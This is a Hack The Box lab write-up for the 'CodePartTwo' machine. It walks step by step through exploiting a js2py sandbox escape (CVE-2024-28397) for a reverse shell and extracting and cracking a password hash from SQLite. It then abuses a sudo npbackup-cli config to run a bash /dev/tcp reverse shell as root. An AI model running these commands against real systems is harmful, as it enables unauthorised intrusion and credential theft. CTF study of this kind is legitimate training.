# Hack The Box — CodePartTwo

Difficulty: Medium
OS: Linux
Attack Path: Web RCE → app → marco → root

# 1. Initial Enumeration
Port Scan
```
nmap -sC -sV -p- 10.10.11.82
```


Relevant Results

8000/tcp — Flask web application

## 2. Web Application Analysis (Port 8000)

Browsing http://10.10.11.82:8000 revealed a Flask application that allows users to execute JavaScript code via the /run_code endpoint.

Application logic showed the use of js2py:

import js2py
js2py.disable_pyimport()


Despite attempted sandboxing, the js2py version in use is vulnerable.

## 3. Initial Foothold — js2py Sandbox Escape
Vulnerability

CVE-2024-28397 — js2py sandbox escape leading to remote code execution

Exploit Used

🔗 https://github.com/naclapor/CVE-2024-28397

Exploit Execution (Attacker)

Listener started:
```
nc -lvnp 4444
```


Exploit executed using the repository’s Python script:

```
python3 exploit.py --target http://10.10.11.82:8000/run_code --lhost 10.10.16.168
```


This returned a reverse shell.

whoami
app

4. Shell Stabilization (User: app)
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```


Attacker terminal:

CTRL+Z
stty raw -echo
fg


Target terminal:

export TERM=xterm
stty rows 40 columns 120

## 5. Privilege Escalation — app → marco
SQLite Credential Discovery
cd /home/app/app/instance
```
sqlite3 users.db
```

```
.tables
```
```
SELECT username, password_hash FROM user;
```


An MD5 password hash for user marco was recovered.

Password Hash Cracking (Hashcat)
echo '<md5_hash>' > hash.txt
```
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
```


User switch:

su marco

6. User Flag (User: marco)
cd /home/marco
cat user.txt

## 7. Privilege Escalation — marco → root
Sudo Enumeration
sudo -l

(ALL) NOPASSWD: /usr/local/bin/npbackup-cli

## 8. Preparing the Backup Configuration

The default backup configuration file was located in the marco home directory.

To avoid modifying the original file and to ensure write permissions, it was copied to /tmp:

```
cp /home/marco/npbackup.conf /tmp/npbackup.conf
```


The copied configuration file was then edited:

nano /tmp/npbackup.conf

9. Root Exploitation — npbackup-cli Misconfiguration

The npbackup-cli utility executes post_exec_commands from the configuration file as root.

The following payload was added to /tmp/npbackup.conf:

post_exec_commands: [bash -c 'bash -i >& /dev/tcp/10.10.16.168/4444 0>&1']

Listener (Attacker)
nc -lvnp 4444

Trigger Root Execution
sudo /usr/local/bin/npbackup-cli -c /tmp/npbackup.conf --backup --force


This forced execution of the backup job and triggered the post-execution command.

## 10. Root Shell Stabilization
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
export TERM=xterm
stty rows 40 columns 120


Verification:

whoami
root

## 11. Root Flag
cat /root/root.txt


## 12. Attack Chain Summary
Web App (Port 8000)
  ↓
CVE-2024-28397 (js2py sandbox escape)
  ↓
Reverse shell as app
  ↓
Shell stabilization
  ↓
SQLite credential extraction
  ↓
MD5 hash cracked with Hashcat
  ↓
User marco
  ↓
user.txt retrieved
  ↓
Copy npbackup.conf to /tmp
  ↓
sudo npbackup-cli with malicious config
  ↓
post_exec_commands reverse shell
  ↓
root
